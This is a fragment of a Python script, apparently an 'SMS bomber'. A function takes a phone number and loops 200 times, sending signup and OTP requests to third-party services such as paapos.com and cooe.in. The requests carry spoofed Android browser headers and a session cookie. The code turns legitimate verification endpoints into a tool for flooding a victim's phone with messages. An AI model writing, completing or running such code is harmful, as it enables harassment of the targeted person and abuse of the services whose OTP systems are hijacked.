...
def smsg(number):
   ...
   # start_time = time.time()
    ...
    for _ in range(200):
        ...
        {
            "url": "https://paapos.com/login.aspx/getOTPBN",
            "payload": {"MobileNo": number, "Type": "Signup"},
            "headers": {"Host": "paapos.com", "Content-Length": "41", "Sec-Ch-Ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Android WebView";v="122"', "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/json; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Mobile": "?1", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.106 Mobile Safari/537.36", "Sec-Ch-Ua-Platform": '"Android"', "Origin": "https://paapos.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://paapos.com/login.aspx", "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "en-US,en;q=0.9", "Cookie": "ASP.NET_SessionId=blbv4w0owenr1fol15jffkjn"}
        },
        {
        ...
        {
            "url": "https://cooe.in/user/send_verify_code",
            "payload": {"mobile_number": "+91" + number, "verify_type": "register"},
            "headers": {"Content-Type": "application/json"}
        },
